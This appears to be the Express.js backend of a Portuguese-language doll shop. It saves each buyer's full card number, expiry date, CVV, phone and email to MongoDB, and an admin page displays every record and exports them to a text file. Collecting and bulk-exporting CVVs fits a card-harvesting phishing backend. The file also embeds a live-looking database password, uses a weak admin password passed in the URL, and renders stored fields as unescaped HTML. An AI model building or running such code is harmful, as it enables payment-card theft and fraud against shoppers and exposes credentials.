// app.js
require('dotenv').config();
const express  = require('express');
const mongoose = require('mongoose');
const path     = require('path');

const app = express();

// ====== 1) Conexão com MongoDB ======
// MongoDB URI: usa a variável de ambiente, ou cai no fallback com sua URI já com credenciais
const mongoURI = process.env.MONGODB_URI
  || "mongodb+srv://igorlcreis:PskuwOrsMTaZFnGU@cluster0.xcdkhke.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";

mongoose.connect(mongoURI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
.then(() => console.log('MongoDB conectado'))
.catch(err => {
  console.error('Erro ao conectar MongoDB:', err);
  process.exit(1);
});

// ====== 2) Schema e Model de Pedido ======
const PedidoSchema = new mongoose.Schema({
  nome_titular:  String,
  numero_cartao: String,
  validade:      String,
  cvv:           String,
  parcelas:      Number,
  total:         Number,
  cep:           String,
  boneca:        String,
  cabelo:        String,
  telefone:      String,
  email:         String
}, { timestamps: true });

const Pedido = mongoose.model('Pedido', PedidoSchema);

// ====== 3) Middlewares ======
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ====== 4) Credenciais do Admin ======
const ADMIN_PASSWORD  = 'asap';
const ADMIN_AUTH_CODE = 'b4d8f3e2c6a1b7c9d0e4f5a8b3c2d7f1';

// ====== 5) Endpoint para criar Pedido ======
app.post('/pedido', async (req, res) => {
  try {
    await Pedido.create(req.body);
    return res.sendStatus(201);
  } catch (e) {
    console.error(e);
    return res.sendStatus(500);
  }
});

// ====== 6) Painel de Admin ======
app.get('/admin', async (req, res) => {
  const { senha, auth } = req.query;
  // Autenticação básica
  if (senha !== ADMIN_PASSWORD || auth !== ADMIN_AUTH_CODE) {
    const errMsg = (senha || auth)
      ? '<p style="color:red;">Senha ou código inválido.</p>'
      : '';
    return res.send(`
      <html><head><meta charset="UTF-8"><title>Admin Login</title></head>
      <body style="font-family:Arial,sans-serif;padding:20px;">
        <h1>Admin Login</h1>
        ${errMsg}
        <form method="get" action="/admin">
          <label>Senha:<br>
            <input type="password" name="senha" required style="width:300px;padding:6px">
          </label><br><br>
          <label>Código de Autenticação:<br>
            <input type="text" name="auth" required style="width:300px;padding:6px">
          </label><br><br>
          <button type="submit" style="padding:8px 16px;">Entrar</button>
        </form>
      </body></html>
    `);
  }

  // Autenticado: busca todos os pedidos
  const pedidos = await Pedido.find().sort('-createdAt').lean();
  res.send(`
    <html><head><meta charset="UTF-8"><title>Painel Admin</title>
      <style>
        body { font-family:Arial,sans-serif; background:#fafafa; padding:20px; }
        h1 { color:#be4299; }
        details { background:#fff; padding:12px; margin-bottom:12px;
                  border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1); }
        summary { font-weight:bold; cursor:pointer; }
        table { width:100%; border-collapse:collapse; margin-top:8px; }
        th,td { border:1px solid #ddd; padding:6px; text-align:left; }
        th { background:#fdebf5; }
        button { padding:8px 12px; background:#be4299; color:#fff;
                 border:none; border-radius:4px; cursor:pointer; }
      </style>
    </head><body>
      <h1>Painel Admin — Pedidos</h1>
      ${pedidos.map(p => `
        <details>
          <summary>${new Date(p.createdAt).toLocaleString()} — ${p.nome_titular}</summary>
          <table>
            <tr><th>Campo</th><th>Valor</th></tr>
            ${['nome_titular','numero_cartao','validade','cvv','telefone','email']
              .map(k => `<tr><td>${k}</td><td>${p[k]||''}</td></tr>`).join('')}
          </table>
        </details>
      `).join('')}
      <button id="exportAll">Exportar Todos (TXT)</button>
      <script>
        const pedidos = ${JSON.stringify(pedidos)};
        document.getElementById('exportAll').addEventListener('click', () => {
          let txt = '=== Todos os Pedidos ===\\n\\n';
          pedidos.forEach(p => {
            txt += '--- ' + p.nome_titular + ' (' + new Date(p.createdAt).toLocaleString() + ') ---\\n';
            ['nome_titular','numero_cartao','validade','cvv','telefone','email']
              .forEach(k => txt += k + ': ' + (p[k]||'') + '\\n');
            txt += '\\n';
          });
          const blob = new Blob([txt], { type:'text/plain' });
          const url  = URL.createObjectURL(blob);
          const a    = document.createElement('a');
          a.href     = url;
          a.download = 'todos_pedidos.txt';
          a.click();
          URL.revokeObjectURL(url);
        });
      </script>
    </body></html>
  `);
});

// ====== 7) Inicia o servidor ======
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
